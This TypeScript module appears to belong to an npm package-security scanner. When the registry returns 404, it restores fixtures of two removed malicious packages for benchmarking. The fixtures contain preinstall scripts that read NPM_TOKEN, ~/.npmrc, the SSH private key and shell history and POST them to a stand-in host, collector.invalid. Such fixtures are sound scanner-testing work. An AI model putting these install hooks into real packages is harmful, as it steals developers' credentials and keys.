import { mkdirSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import type { ScanListener } from "./scanner.js";

export interface HistoricalPackageRestoreResult {
  name: string;
  version: string;
  path: string;
}

interface HistoricalPackageFixture {
  version: string;
  source: string;
  files: Record<string, string>;
}

function fixturePackageJson(name: string, version: string, scriptName: string): string {
  return `${JSON.stringify({
    name,
    version,
    description: "Curated historical malicious-package fixture for benchmark fallback",
    scripts: {
      preinstall: `node ${scriptName}`,
    },
  }, null, 2)}\n`;
}

const HISTORICAL_PACKAGE_FIXTURES: Readonly<Record<string, HistoricalPackageFixture>> = {
  ngfm: {
    version: "1.0.0-historical-fixture",
    source: "Curated local fixture preserving the reported preinstall data-exfil shape after npm registry removal.",
    files: {
      "package.json": fixturePackageJson("ngfm", "1.0.0-historical-fixture", "preinstall.js"),
      "preinstall.js": [
        "const https = require('https');",
        "const child_process = require('child_process');",
        "const token = process.env.NPM_TOKEN || '';",
        "const npmrc = child_process.execSync('cat ~/.npmrc 2>/dev/null || true').toString();",
        "https.request('https://collector.invalid/exfil', { method: 'POST' }).end(JSON.stringify({ token, npmrc }));",
      ].join("\n"),
    },
  },
  "rocketrefer": {
    version: "1.0.0-historical-fixture",
    source: "Curated local fixture preserving the reported credential-stealer install-hook shape after npm registry removal.",
    files: {
      "package.json": fixturePackageJson("rocketrefer", "1.0.0-historical-fixture", "preinstall.js"),
      "preinstall.js": [
        "const fs = require('fs');",
        "const https = require('https');",
        "const child_process = require('child_process');",
        "const browser = fs.existsSync(process.env.HOME + '/.ssh/id_rsa') ? fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8') : '';",
        "const history = child_process.execSync('cat ~/.bash_history 2>/dev/null || true').toString();",
        "https.request('https://collector.invalid/creds', { method: 'POST' }).end(JSON.stringify({ browser, history }));",
      ].join("\n"),
    },
  },
};

export function shouldUseHistoricalPackageFallback(errorMessage: string): boolean {
  return /\bE404\b|\b404\b/i.test(errorMessage);
}

export function restoreHistoricalPackageFixture(
  packageName: string,
  tempDir: string,
  emit?: ScanListener,
): HistoricalPackageRestoreResult | null {
  const fixture = HISTORICAL_PACKAGE_FIXTURES[packageName];
  if (!fixture) return null;

  const packageDir = join(tempDir, "node_modules", packageName);
  mkdirSync(packageDir, { recursive: true });

  for (const [relativePath, content] of Object.entries(fixture.files)) {
    const absPath = join(packageDir, relativePath);
    mkdirSync(dirname(absPath), { recursive: true });
    writeFileSync(absPath, content, "utf8");
  }

  emit?.({
    type: "stage:end",
    stage: "discovery",
    message: `Restored ${packageName}@${fixture.version} from curated historical fixture cache`,
  });

  return {
    name: packageName,
    version: fixture.version,
    path: packageDir,
  };
}
